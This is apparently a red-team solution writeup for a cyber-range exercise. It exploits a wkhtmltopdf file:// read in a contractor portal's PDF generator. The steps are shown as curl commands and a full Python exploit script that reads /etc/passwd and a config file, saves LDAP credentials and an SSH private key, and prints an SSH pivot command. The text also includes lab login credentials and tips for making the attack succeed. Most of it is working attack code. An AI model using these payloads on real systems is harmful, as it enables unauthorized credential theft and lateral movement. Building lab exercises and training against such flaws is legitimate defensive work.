# solve_red.md — M5 · ext-contractor
## Red Team Solution Writeup
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Machine:** M5 — RPAL Contractor Onboarding Portal
**Vulnerability:** wkhtmltopdf 0.12.5 SSRF via `file://` URI → Local File Read → Pivot Credentials
**CWE:** CWE-918 (SSRF) + CWE-552 (Files or Directories Accessible to External Parties)
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1552.001 (Credentials in Files)
**Severity:** Critical — reads SSH private key + LDAP credentials → RNG-EXT-02 pivot

---

## Overview — What, Why, and How

### What is this vulnerability?

wkhtmltopdf is a tool that converts HTML to PDF. It renders HTML using the WebKit browser engine, which means it can fetch external resources: CSS files, images, JavaScript, and importantly — external URLs specified in `<img>`, `<iframe>`, or as separate page arguments.

**wkhtmltopdf 0.12.5** (released 2016, still widely deployed) supports the `file://` URI scheme, allowing it to read local filesystem files when generating PDFs. When a web application passes a user-controlled URL to wkhtmltopdf, the attacker can specify:

```
file:///etc/passwd
file:///etc/rpal/upstream/config.ini
file:///root/.ssh/id_rsa
```

The server reads the file on the attacker's behalf and includes its content in the generated PDF.

### Why does this vulnerability exist?

The contractor portal uses wkhtmltopdf to generate PDF summaries of contractor applications. The "Company Profile URL" field is intended for contractors to provide their company website, which gets fetched and embedded as an additional page in the PDF for RPAL procurement reviewers.

The developer passed the URL directly to wkhtmltopdf with:
- `--enable-local-file-access` flag (explicitly enabled)
- `--allow ""` (allows all paths)

These flags were added during development to allow embedding local HTML templates and were never removed. The security review focused on the upload functionality and missed the PDF generation code path entirely.

---

## Prerequisites

- Valid contractor credentials from M1 system-config (or known credentials): `contractor.01 / Contractor@2024!`
- Target: `http://203.x.x.x:9000/`
- Tools: `curl` or browser, PDF reader

---

## Phase 1 — Reconnaissance

```bash
# Identify the service
curl -si http://203.x.x.x:9000/ | head -10

# Check for PDF generation functionality
curl -s http://203.x.x.x:9000/ | grep -i "pdf\|profile\|url"

# Login and look at the application form
curl -s -c /tmp/ctr.jar -X POST http://203.x.x.x:9000/login \
     -d "username=contractor.01&password=Contractor%402024%21" -L | \
     grep -i "company_profile_url\|profile"
```

The application form at `/apply` has a field `company_profile_url` that is described as:
> "Your company website or profile page URL. This will be fetched and included in the application PDF summary."

This tells you: the URL you provide is fetched server-side. Test for SSRF.

---

## Phase 2 — Confirming SSRF via file://

### 2.1 — Submit file:// URL

```bash
# Login
curl -s -c /tmp/ctr.jar -b /tmp/ctr.jar -X POST http://203.x.x.x:9000/login \
     -d "username=contractor.01&password=Contractor%402024%21" -L -o /dev/null

# Submit application with file:// URL for /etc/passwd
curl -s -c /tmp/ctr.jar -b /tmp/ctr.jar -X POST http://203.x.x.x:9000/apply \
     -d "company_name=Test+Corp&contact_name=Test+User&contact_email=test@test.com\
&work_category=IT+%26+Digital+Services&company_profile_url=file%3A%2F%2F%2Fetc%2Fpasswd\
&pan_number=AAAAA9999A" | grep -i "pdf_path\|download-pdf\|Application ID"
```

### 2.2 — Download the PDF and Extract Contents

```bash
# The response contains a link to download the PDF
# Download it
PDF_PATH=$(curl -s -c /tmp/ctr.jar -b /tmp/ctr.jar \
    -X POST http://203.x.x.x:9000/apply \
    -d "company_name=SSRF+Test&contact_name=Attacker&contact_email=atk@atk.com\
&work_category=Offshore+Drilling+Services\
&company_profile_url=file%3A%2F%2F%2Fetc%2Fpasswd&pan_number=AAAAA0000A" | \
    grep -o 'path=[^"&]*' | head -1 | cut -d= -f2)

echo "PDF path: $PDF_PATH"

curl -s -c /tmp/ctr.jar -b /tmp/ctr.jar \
    "http://203.x.x.x:9000/download-pdf?path=${PDF_PATH}" \
    -o /tmp/test_ssrf.pdf

# Extract text from PDF (if pdftotext is available)
pdftotext /tmp/test_ssrf.pdf - | grep -A5 "root:"
# OR open the PDF and look at page 2 — it contains /etc/passwd content
```

If `/etc/passwd` appears on page 2 of the PDF, SSRF is confirmed.

---

## Phase 3 — Extract Pivot Credentials

```bash
# Target the config file containing SSH key and LDAP credentials
curl -s -c /tmp/ctr.jar -b /tmp/ctr.jar \
    -X POST http://203.x.x.x:9000/apply \
    -d "company_name=RPAL+Config+Extract&contact_name=Varuna-2&\
contact_email=op@neel.trishul&work_category=IT+%26+Digital+Services&\
company_profile_url=file%3A%2F%2F%2Fetc%2Frpal%2Fupstream%2Fconfig.ini&\
pan_number=AAAAA0000A" | grep -o 'path=[^"&]*' | head -1 | cut -d= -f2 > /tmp/pdf_path.txt

PDF_PATH=$(cat /tmp/pdf_path.txt)

curl -s -c /tmp/ctr.jar -b /tmp/ctr.jar \
    "http://203.x.x.x:9000/download-pdf?path=${PDF_PATH}" \
    -o /tmp/rpal_config.pdf

pdftotext /tmp/rpal_config.pdf -
```

**Full exploit script:**

```python
#!/usr/bin/env python3
"""
wkhtmltopdf SSRF — M5 RPAL Contractor Portal
Reads /etc/rpal/upstream/config.ini containing SSH key + LDAP credentials
"""
import requests, re, subprocess, os

TARGET = "http://203.x.x.x:9000"
SESSION = requests.Session()

# Login
SESSION.post(f"{TARGET}/login",
    data={"username": "contractor.01", "password": "Contractor@2024!"})

# Submit with malicious file:// URL
TARGET_FILE = "file:///etc/rpal/upstream/config.ini"
resp = SESSION.post(f"{TARGET}/apply", data={
    "company_name":        "NEEL-TRISHUL-OPS",
    "contact_name":        "Varuna-2",
    "contact_email":       "ops@neel.in",
    "work_category":       "IT & Digital Services",
    "company_profile_url": TARGET_FILE,
    "pan_number":          "AAAAA0000A",
})

# Extract PDF download path
m = re.search(r'path=(/tmp/rpal-pdf-[^"&\s]+\.pdf)', resp.text)
if not m:
    print("[-] No PDF path found in response")
    exit(1)

pdf_path = m.group(1)
print(f"[+] PDF generated at: {pdf_path}")

# Download PDF
pdf_resp = SESSION.get(f"{TARGET}/download-pdf", params={"path": pdf_path})
with open("/tmp/stolen_config.pdf", "wb") as f:
    f.write(pdf_resp.content)
print(f"[+] PDF downloaded ({len(pdf_resp.content)} bytes)")

# Extract text from PDF
result = subprocess.run(["pdftotext", "/tmp/stolen_config.pdf", "-"],
    capture_output=True, text=True)
config_text = result.stdout

print("\n[+] Contents of /etc/rpal/upstream/config.ini:")
print("="*60)
print(config_text)
print("="*60)

# Parse key credentials
import re
for pattern, label in [
    (r'bind_password\s*=\s*(.+)', "LDAP bind_password"),
    (r'key_passphrase\s*=\s*(.+)', "SSH passphrase"),
    (r'jump_host\s*=\s*(.+)', "Jump host"),
    (r'jump_user\s*=\s*(.+)', "Jump user"),
]:
    m = re.search(pattern, config_text)
    if m:
        print(f"[+] {label}: {m.group(1).strip()}")

# Extract SSH private key
key_match = re.search(r'(-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----)',
                       config_text, re.DOTALL)
if key_match:
    with open("/tmp/svc-deploy-rsa", "w") as f:
        f.write(key_match.group(1))
    os.chmod("/tmp/svc-deploy-rsa", 0o600)
    print("\n[+] SSH private key saved to /tmp/svc-deploy-rsa")
    print("[+] PIVOT: ssh -i /tmp/svc-deploy-rsa -p 22 svc-deploy@203.x.x.x")
```

---

## Pitfalls and Common Mistakes

### Pitfall 1 — wkhtmltopdf Version Matters
Only versions < 0.12.6 support `file://` without additional safeguards. wkhtmltopdf 0.12.6 (2020) added `--disable-local-file-access` as the default. Always check the version — the server header or a deliberately visible page may hint at it.

### Pitfall 2 — The file:// URL Must Be URL-Encoded in Form Submission
When submitting via a POST form, the URL must be percent-encoded:
- `file:///etc/passwd` → `file%3A%2F%2F%2Fetc%2Fpasswd`
Use `python3 -c "import urllib.parse; print(urllib.parse.quote('file:///etc/rpal/upstream/config.ini'))"` for accuracy.

### Pitfall 3 — PDF Text Extraction
The file content appears on page 2 of the PDF. Use `pdftotext` to extract it. If `pdftotext` is not available, open the PDF in a reader — the text is fully readable. Binary files like `/etc/ssl/private/` keys may not render correctly in PDF — prefer text files.

### Pitfall 4 — Large Files May Timeout
wkhtmltopdf has a 30-second timeout. Very large files (logs, binary files) may cause a timeout. Start with small, known text files to confirm the vulnerability before targeting the config file.

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Lateral Movement | Remote Services: SSH | T1021.004 |

---
*solve_red.md | M5 ext-contractor | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
